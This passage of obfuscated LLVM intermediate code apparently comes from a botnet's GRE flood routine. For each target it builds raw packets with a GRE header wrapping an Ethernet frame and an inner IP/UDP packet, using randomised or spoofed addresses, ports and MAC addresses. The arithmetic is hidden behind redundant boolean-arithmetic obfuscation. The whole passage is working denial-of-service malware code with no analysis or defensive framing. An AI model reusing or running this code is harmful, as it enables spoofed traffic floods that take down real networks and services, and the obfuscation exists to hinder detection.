  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %89
  %91 = sub i64 %87, %90
  %92 = add nsw i64 %87, %89
  %93 = trunc i64 %91 to i32
  store i32 %93, i32* %24, align 4
  %94 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %94, i32* %12, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %5
  br label %627

; <label>:97:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %98 = load i32, i32* %12, align 4
  %99 = bitcast i32* %11 to i8*
  %100 = call i32 @setsockopt(i32 %98, i32 0, i32 3, i8* %99, i32 4) #6
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %97
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @close(i32 %103)
  br label %627

; <label>:105:                                    ; preds = %97
  store i32 0, i32* %11, align 4
  br label %106

; <label>:106:                                    ; preds = %352, %105
  %107 = load i32, i32* %11, align 4
  %108 = load i8, i8* %7, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %357

; <label>:111:                                    ; preds = %106
  %112 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %113 = load i8**, i8*** %13, align 8
  %114 = load i32, i32* %11, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8*, i8** %113, i64 %115
  store i8* %112, i8** %116, align 8
  %117 = load i8**, i8*** %13, align 8
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds i8*, i8** %117, i64 %119
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to %struct.iphdr*
  store %struct.iphdr* %122, %struct.iphdr** %25, align 8
  %123 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i64 1
  %125 = bitcast %struct.iphdr* %124 to %struct.grehdr*
  store %struct.grehdr* %125, %struct.grehdr** %26, align 8
  %126 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %127 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %126, i64 1
  %128 = bitcast %struct.grehdr* %127 to %struct.ethhdr*
  store %struct.ethhdr* %128, %struct.ethhdr** %27, align 8
  %129 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %130 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %129, i64 1
  %131 = bitcast %struct.ethhdr* %130 to %struct.iphdr*
  store %struct.iphdr* %131, %struct.iphdr** %28, align 8
  %132 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i64 1
  %134 = bitcast %struct.iphdr* %133 to %struct.udphdr*
  store %struct.udphdr* %134, %struct.udphdr** %29, align 8
  %135 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %136 = bitcast %struct.iphdr* %135 to i8*
  %137 = load i8, i8* %136, align 4
  %138 = xor i8 15, -1
  %139 = xor i8 %137, %138
  %140 = and i8 %139, %137
  %141 = and i8 %137, 15
  %142 = and i8 %140, 64
  %143 = xor i8 %140, 64
  %144 = or i8 %142, %143
  %145 = or i8 %140, 64
  store i8 %144, i8* %136, align 4
  %146 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = xor i8 -16, -1
  %150 = xor i8 %148, %149
  %151 = and i8 %150, %148
  %152 = and i8 %148, -16
  %153 = xor i8 %151, -1
  %154 = xor i8 5, -1
  %155 = xor i8 9, -1
  %156 = and i8 %153, 9
  %157 = and i8 %151, %155
  %158 = and i8 %154, 9
  %159 = and i8 5, %155
  %160 = or i8 %156, %157
  %161 = or i8 %158, %159
  %162 = xor i8 %160, %161
  %163 = or i8 %153, %154
  %164 = xor i8 %163, -1
  %165 = or i8 9, %155
  %166 = and i8 %164, %165
  %167 = or i8 %162, %166
  %168 = or i8 %151, 5
  store i8 %167, i8* %147, align 4
  %169 = load i8, i8* %14, align 1
  %170 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 1
  store i8 %169, i8* %171, align 1
  %172 = load i32, i32* %20, align 4
  %173 = sext i32 %172 to i64
  %174 = sub i64 0, %173
  %175 = sub i64 66, %174
  %176 = add i64 66, %173
  %177 = trunc i64 %175 to i16
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 2
  store i16 %178, i16* %180, align 2
  %181 = load i16, i16* %15, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 3
  store i16 %182, i16* %184, align 4
  %185 = load i8, i8* %16, align 1
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 5
  store i8 %185, i8* %187, align 4
  %188 = load i8, i8* %17, align 1
  %189 = icmp ne i8 %188, 0
  br i1 %189, label %190, label %194

; <label>:190:                                    ; preds = %111
  %191 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %192 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 4
  store i16 %191, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %190, %111
  %195 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 6
  store i8 47, i8* %196, align 1
  %197 = load i32, i32* %23, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 8
  store i32 %197, i32* %199, align 4
  %200 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %201 = load i32, i32* %11, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 9
  store i32 %205, i32* %207, align 4
  %208 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %209 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %210 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %209, i32 0, i32 1
  store i16 %208, i16* %210, align 2
  %211 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %212 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %213 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %212, i32 0, i32 2
  store i16 %211, i16* %213, align 1
  %214 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %215 = bitcast %struct.iphdr* %214 to i8*
  %216 = load i8, i8* %215, align 4
  %217 = xor i8 15, -1
  %218 = xor i8 %216, %217
  %219 = and i8 %218, %216
  %220 = and i8 %216, 15
  %221 = xor i8 %219, -1
  %222 = xor i8 64, -1
  %223 = xor i8 107, -1
  %224 = and i8 %221, 107
  %225 = and i8 %219, %223
  %226 = and i8 %222, 107
  %227 = and i8 64, %223
  %228 = or i8 %224, %225
  %229 = or i8 %226, %227
  %230 = xor i8 %228, %229
  %231 = or i8 %221, %222
  %232 = xor i8 %231, -1
  %233 = or i8 107, %223
  %234 = and i8 %232, %233
  %235 = or i8 %230, %234
  %236 = or i8 %219, 64
  store i8 %235, i8* %215, align 4
  %237 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %238 = bitcast %struct.iphdr* %237 to i8*
  %239 = load i8, i8* %238, align 4
  %240 = xor i8 -16, -1
  %241 = xor i8 %239, %240
  %242 = and i8 %241, %239
  %243 = and i8 %239, -16
  %244 = xor i8 %242, -1
  %245 = xor i8 5, -1
  %246 = xor i8 33, -1
  %247 = and i8 %244, 33
  %248 = and i8 %242, %246
  %249 = and i8 %245, 33
  %250 = and i8 5, %246
  %251 = or i8 %247, %248
  %252 = or i8 %249, %250
  %253 = xor i8 %251, %252
  %254 = or i8 %244, %245
  %255 = xor i8 %254, -1
  %256 = or i8 33, %246
  %257 = and i8 %255, %256
  %258 = or i8 %253, %257
  %259 = or i8 %242, 5
  store i8 %258, i8* %238, align 4
  %260 = load i8, i8* %14, align 1
  %261 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 1
  store i8 %260, i8* %262, align 1
  %263 = load i32, i32* %20, align 4
  %264 = sext i32 %263 to i64
  %265 = add i64 28, 7538787739375800010
  %266 = add i64 %265, %264
  %267 = sub i64 %266, 7538787739375800010
  %268 = add i64 28, %264
  %269 = trunc i64 %267 to i16
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 2
  store i16 %270, i16* %272, align 2
  %273 = load i16, i16* %15, align 2
  %274 = zext i16 %273 to i32
  %275 = xor i32 %274, -1
  %276 = and i32 805909692, %275
  %277 = xor i32 805909692, -1
  %278 = and i32 %274, %277
  %279 = xor i32 -1, -1
  %280 = and i32 %279, 805909692
  %281 = and i32 -1, %277
  %282 = or i32 %276, %278
  %283 = or i32 %280, %281
  %284 = xor i32 %282, %283
  %285 = xor i32 %274, -1
  %286 = trunc i32 %284 to i16
  %287 = call zeroext i16 @htons(i16 zeroext %286) #7
  %288 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  %290 = load i8, i8* %16, align 1
  %291 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 5
  store i8 %290, i8* %292, align 4
  %293 = load i8, i8* %17, align 1
  %294 = icmp ne i8 %293, 0
  br i1 %294, label %295, label %299

; <label>:295:                                    ; preds = %194
  %296 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %297 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 4
  store i16 %296, i16* %298, align 2
  br label %299

; <label>:299:                                    ; preds = %295, %194
  %300 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 6
  store i8 17, i8* %301, align 1
  %302 = call i32 @rand_next()
  %303 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 8
  store i32 %302, i32* %304, align 4
  %305 = load i8, i8* %22, align 1
  %306 = icmp ne i8 %305, 0
  br i1 %306, label %307, label %313

; <label>:307:                                    ; preds = %299
  %308 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  %310 = load i32, i32* %309, align 4
  %311 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 9
  store i32 %310, i32* %312, align 4
  br label %333

; <label>:313:                                    ; preds = %299
  %314 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 8
  %316 = load i32, i32* %315, align 4
  %317 = sub i32 0, 1024
  %318 = add i32 %316, %317
  %319 = sub i32 %316, 1024
  %320 = xor i32 %318, -1
  %321 = and i32 -735762999, %320
  %322 = xor i32 -735762999, -1
  %323 = and i32 %318, %322
  %324 = xor i32 -1, -1
  %325 = and i32 %324, -735762999
  %326 = and i32 -1, %322
  %327 = or i32 %321, %323
  %328 = or i32 %325, %326
  %329 = xor i32 %327, %328
  %330 = xor i32 %318, -1
  %331 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 9
  store i32 %329, i32* %332, align 4
  br label %333

; <label>:333:                                    ; preds = %313, %307
  %334 = load i16, i16* %18, align 2
  %335 = call zeroext i16 @htons(i16 zeroext %334) #7
  %336 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %337 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %336, i32 0, i32 0
  store i16 %335, i16* %337, align 2
  %338 = load i16, i16* %19, align 2
  %339 = call zeroext i16 @htons(i16 zeroext %338) #7
  %340 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 1
  store i16 %339, i16* %341, align 2
  %342 = load i32, i32* %20, align 4
  %343 = sext i32 %342 to i64
  %344 = sub i64 8, 8463741110874134278
  %345 = add i64 %344, %343
  %346 = add i64 %345, 8463741110874134278
  %347 = add i64 8, %343
  %348 = trunc i64 %346 to i16
  %349 = call zeroext i16 @htons(i16 zeroext %348) #7
  %350 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 2
  store i16 %349, i16* %351, align 2
  br label %352

; <label>:352:                                    ; preds = %333
  %353 = load i32, i32* %11, align 4
  %354 = sub i32 0, 1
  %355 = sub i32 %353, %354
  %356 = add nsw i32 %353, 1
  store i32 %355, i32* %11, align 4
  br label %106

; <label>:357:                                    ; preds = %106
  br label %358

; <label>:358:                                    ; preds = %626, %357
  store i32 0, i32* %11, align 4
  br label %359

; <label>:359:                                    ; preds = %614, %358
  %360 = load i32, i32* %11, align 4
  %361 = load i8, i8* %7, align 1
  %362 = zext i8 %361 to i32
  %363 = icmp slt i32 %360, %362
  br i1 %363, label %364, label %620

; <label>:364:                                    ; preds = %359
  %365 = load i8**, i8*** %13, align 8
  %366 = load i32, i32* %11, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds i8*, i8** %365, i64 %367
  %369 = load i8*, i8** %368, align 8
  store i8* %369, i8** %33, align 8
  %370 = load i8*, i8** %33, align 8
  %371 = bitcast i8* %370 to %struct.iphdr*
  store %struct.iphdr* %371, %struct.iphdr** %34, align 8
  %372 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i64 1
  %374 = bitcast %struct.iphdr* %373 to %struct.grehdr*
  store %struct.grehdr* %374, %struct.grehdr** %35, align 8
  %375 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %376 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %375, i64 1
  %377 = bitcast %struct.grehdr* %376 to %struct.ethhdr*
  store %struct.ethhdr* %377, %struct.ethhdr** %36, align 8
  %378 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %379 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %378, i64 1
  %380 = bitcast %struct.ethhdr* %379 to %struct.iphdr*
  store %struct.iphdr* %380, %struct.iphdr** %37, align 8
  %381 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i64 1
  %383 = bitcast %struct.iphdr* %382 to %struct.udphdr*
  store %struct.udphdr* %383, %struct.udphdr** %38, align 8
  %384 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %385 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %384, i64 1
  %386 = bitcast %struct.udphdr* %385 to i8*
  store i8* %386, i8** %39, align 8
  %387 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %388 = load i32, i32* %11, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 2
  %392 = load i8, i8* %391, align 4
  %393 = zext i8 %392 to i32
  %394 = icmp slt i32 %393, 32
  br i1 %394, label %395, label %419

; <label>:395:                                    ; preds = %364
  %396 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %397 = load i32, i32* %11, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i64 %398
  %400 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i32 0, i32 1
  %401 = load i32, i32* %400, align 4
  %402 = call i32 @ntohl(i32 %401) #7
  %403 = call i32 @rand_next()
  %404 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %405 = load i32, i32* %11, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %406
  %408 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %407, i32 0, i32 2
  %409 = load i8, i8* %408, align 4
  %410 = zext i8 %409 to i32
  %411 = lshr i32 %403, %410
  %412 = sub i32 %402, 263512810
  %413 = add i32 %412, %411
  %414 = add i32 %413, 263512810
  %415 = add i32 %402, %411
  %416 = call i32 @htonl(i32 %414) #7
  %417 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 9
  store i32 %416, i32* %418, align 4
  br label %419

; <label>:419:                                    ; preds = %395, %364
  %420 = load i32, i32* %23, align 4
  %421 = icmp eq i32 %420, -1
  br i1 %421, label %422, label %426

; <label>:422:                                    ; preds = %419
  %423 = call i32 @rand_next()
  %424 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 8
  store i32 %423, i32* %425, align 4
  br label %426

; <label>:426:                                    ; preds = %422, %419
  %427 = load i16, i16* %15, align 2
  %428 = zext i16 %427 to i32
  %429 = icmp eq i32 %428, 65535
  br i1 %429, label %430, label %464

; <label>:430:                                    ; preds = %426
  %431 = call i32 @rand_next()
  %432 = xor i32 %431, -1
  %433 = xor i32 65535, -1
  %434 = xor i32 -1673492320, -1
  %435 = or i32 %432, %433
  %436 = or i32 -1673492320, %434
  %437 = xor i32 %435, -1
  %438 = and i32 %437, %436
  %439 = and i32 %431, 65535
  %440 = trunc i32 %438 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  %443 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %444 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %443, i32 0, i32 3
  %445 = load i16, i16* %444, align 4
  %446 = zext i16 %445 to i32
  %447 = sub i32 0, 1000
  %448 = add i32 %446, %447
  %449 = sub nsw i32 %446, 1000
  %450 = xor i32 %448, -1
  %451 = and i32 2080034681, %450
  %452 = xor i32 2080034681, -1
  %453 = and i32 %448, %452
  %454 = xor i32 -1, -1
  %455 = and i32 %454, 2080034681
  %456 = and i32 -1, %452
  %457 = or i32 %451, %453
  %458 = or i32 %455, %456
  %459 = xor i32 %457, %458
  %460 = xor i32 %448, -1
  %461 = trunc i32 %459 to i16
  %462 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 3
  store i16 %461, i16* %463, align 4
  br label %464

; <label>:464:                                    ; preds = %430, %426
  %465 = load i16, i16* %18, align 2
  %466 = zext i16 %465 to i32
  %467 = icmp eq i32 %466, 65535
  br i1 %467, label %468, label %477

; <label>:468:                                    ; preds = %464
  %469 = call i32 @rand_next()
  %470 = xor i32 65535, -1
  %471 = xor i32 %469, %470
  %472 = and i32 %471, %469
  %473 = and i32 %469, 65535
  %474 = trunc i32 %472 to i16
  %475 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 0
  store i16 %474, i16* %476, align 2
  br label %477

; <label>:477:                                    ; preds = %468, %464
  %478 = load i16, i16* %19, align 2
  %479 = zext i16 %478 to i32
  %480 = icmp eq i32 %479, 65535
  br i1 %480, label %481, label %494

; <label>:481:                                    ; preds = %477
  %482 = call i32 @rand_next()
  %483 = xor i32 %482, -1
  %484 = xor i32 65535, -1
  %485 = xor i32 -542507698, -1
  %486 = or i32 %483, %484
  %487 = or i32 -542507698, %485
  %488 = xor i32 %486, -1
  %489 = and i32 %488, %487
  %490 = and i32 %482, 65535
  %491 = trunc i32 %489 to i16
  %492 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %493 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %492, i32 0, i32 1
  store i16 %491, i16* %493, align 2
  br label %494

; <label>:494:                                    ; preds = %481, %477
  %495 = load i8, i8* %22, align 1
  %496 = icmp ne i8 %495, 0
  br i1 %496, label %501, label %497

; <label>:497:                                    ; preds = %494
  %498 = call i32 @rand_next()
  %499 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 9
  store i32 %498, i32* %500, align 4
  br label %507

; <label>:501:                                    ; preds = %494
  %502 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %503 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %502, i32 0, i32 9
  %504 = load i32, i32* %503, align 4
  %505 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 9
  store i32 %504, i32* %506, align 4
  br label %507

; <label>:507:                                    ; preds = %501, %497
  %508 = call i32 @rand_next()
  store i32 %508, i32* %40, align 4
  %509 = call i32 @rand_next()
  store i32 %509, i32* %41, align 4
  %510 = call i32 @rand_next()
  store i32 %510, i32* %42, align 4
  %511 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %512 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %511, i32 0, i32 0
  %513 = getelementptr inbounds [6 x i8], [6 x i8]* %512, i32 0, i32 0
  %514 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %513, i8* %514, i32 4)
  %515 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %516 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %515, i32 0, i32 1
  %517 = getelementptr inbounds [6 x i8], [6 x i8]* %516, i32 0, i32 0
  %518 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %517, i8* %518, i32 4)
  %519 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %520 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %519, i32 0, i32 0
  %521 = getelementptr inbounds [6 x i8], [6 x i8]* %520, i32 0, i32 0
  %522 = getelementptr inbounds i8, i8* %521, i64 4
  %523 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %522, i8* %523, i32 2)
  %524 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %525 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %524, i32 0, i32 1
  %526 = getelementptr inbounds [6 x i8], [6 x i8]* %525, i32 0, i32 0
  %527 = getelementptr inbounds i8, i8* %526, i64 4
  %528 = bitcast i32* %42 to i8*
  %529 = getelementptr inbounds i8, i8* %528, i64 2
  call void @util_memcpy(i8* %527, i8* %529, i32 2)
  %530 = load i8, i8* %21, align 1
  %531 = icmp ne i8 %530, 0
  br i1 %531, label %532, label %539

; <label>:532:                                    ; preds = %507
  %533 = load i8*, i8** %39, align 8
  %534 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %533, i32 %534)
  %535 = load i8*, i8** %39, align 8
  %536 = load i32, i32* %20, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds i8, i8* %535, i64 %537
  store i8 0, i8* %538, align 1
  br label %539

; <label>:539:                                    ; preds = %532, %507
  %540 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 7
  store i16 0, i16* %541, align 2
  %542 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %543 = bitcast %struct.iphdr* %542 to i16*
  %544 = call zeroext i16 @checksum_generic(i16* %543, i32 20)
  %545 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 7
  store i16 %544, i16* %546, align 2
  %547 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %548 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %547, i32 0, i32 7
  store i16 0, i16* %548, align 2
  %549 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %550 = bitcast %struct.iphdr* %549 to i16*
  %551 = call zeroext i16 @checksum_generic(i16* %550, i32 20)
  %552 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %553 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %552, i32 0, i32 7
  store i16 %551, i16* %553, align 2
  %554 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %555 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %554, i32 0, i32 3
  store i16 0, i16* %555, align 2
  %556 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %557 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %558 = bitcast %struct.udphdr* %557 to i8*
  %559 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %560 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %559, i32 0, i32 2
  %561 = load i16, i16* %560, align 2
  %562 = load i32, i32* %20, align 4
  %563 = sext i32 %562 to i64
  %564 = sub i64 0, 8
  %565 = sub i64 0, %563
  %566 = add i64 %564, %565
  %567 = sub i64 0, %566
  %568 = add i64 8, %563
  %569 = trunc i64 %567 to i32
  %570 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %556, i8* %558, i16 zeroext %561, i32 %569)
  %571 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %572 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %571, i32 0, i32 3
  store i16 %570, i16* %572, align 2
  %573 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %574 = load i32, i32* %11, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %573, i64 %575
  %577 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %576, i32 0, i32 0
  %578 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %577, i32 0, i32 0
  store i16 2, i16* %578, align 4
  %579 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 9
  %581 = load i32, i32* %580, align 4
  %582 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %583 = load i32, i32* %11, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 2
  %588 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %587, i32 0, i32 0
  store i32 %581, i32* %588, align 4
  %589 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %590 = load i32, i32* %11, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %589, i64 %591
  %593 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %592, i32 0, i32 0
  %594 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %593, i32 0, i32 1
  store i16 0, i16* %594, align 2
  %595 = load i32, i32* %12, align 4
  %596 = load i8*, i8** %33, align 8
  %597 = load i32, i32* %20, align 4
  %598 = sext i32 %597 to i64
  %599 = sub i64 0, 66
  %600 = sub i64 0, %598
  %601 = add i64 %599, %600
  %602 = sub i64 0, %601
  %603 = add i64 66, %598
